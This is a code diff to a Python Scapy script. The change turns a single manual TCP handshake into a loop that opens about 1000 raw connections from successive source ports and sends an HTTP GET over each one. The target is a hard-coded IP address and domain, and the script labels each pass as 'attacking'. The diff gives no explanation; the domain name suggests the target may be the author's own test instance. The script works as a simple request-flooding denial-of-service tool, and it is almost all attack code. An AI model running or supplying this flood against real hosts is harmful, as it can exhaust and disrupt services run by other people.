@@ -2,25 +2,26 @@ from scapy.all import *
 from random import randint
 
 x = "instance2mymachines.xyz"
-y = "www.instance2mymachines.xyz"
+y = "www.instance2mymachines.xyz:8080"
 ip = "35.193.17.254"
 dport = 8080
-
+sp = 3000
+numgets = 1000
 
 i = IP()
 i.dst = ip
-print ("IP layer prepared: ", i.summary())
+print("IP layer prepared: ", i.summary())
 
-t = TCP()
-t.dport = dport
-t.sport = 4000
-t.flags = "S"
-print("Sending TCP SYN Packet: ", t.summary())
-ans = sr1(i/t)
-print("Reply was: ",ans.summary())
-
-t.seq = ans.ack
-t.ack = ans.seq + 1
-t.flags = "A"
-print("Sending TCP ACK Packet: ", t.summary())
-ans = sr(i/t/"X")
+for s in range(sp, sp + numgets - 1):
+    t = TCP()
+    t.dport = 80
+    t.sport = s
+    t.flags = "S"
+    ans = sr1(i / t, verbose=0)
+    t.seq = ans.ack
+    t.ack = ans.seq + 1
+    t.flags = "A"
+    get = "GET / HTTP/1.1\r\nHost: " + y
+    ans = sr1(i / t / get, verbose=0)
+    print("Attacking from port ", s)
+print("Done!")
